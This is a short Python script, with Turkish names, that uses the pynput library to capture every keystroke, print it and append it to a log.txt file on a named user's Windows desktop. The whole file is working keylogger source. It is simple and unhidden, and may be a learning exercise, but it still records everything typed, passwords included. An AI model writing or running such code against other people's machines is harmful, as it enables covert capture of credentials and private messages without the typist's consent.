from pynput import keyboard

def tusaBasildiginda(tus):

        try:
            print("Basilan tus: {0}".format(tus.char))
            dosya = open("C:\\Users\\Mete\\Desktop\\log.txt",  "a" , encoding="utf8" )
            dosya.write(tus.char)
        
        except AttributeError:
            print("Basilan tus: {0}".format(tus))
            dosya = open("C:\\Users\\Mete\\Desktop\\log.txt",  "a" , encoding="utf8")
            dosya.write("\n"+str(tus)+"\n")

with keyboard.Listener(on_press=tusaBasildiginda ) as listener:
    listener.join()

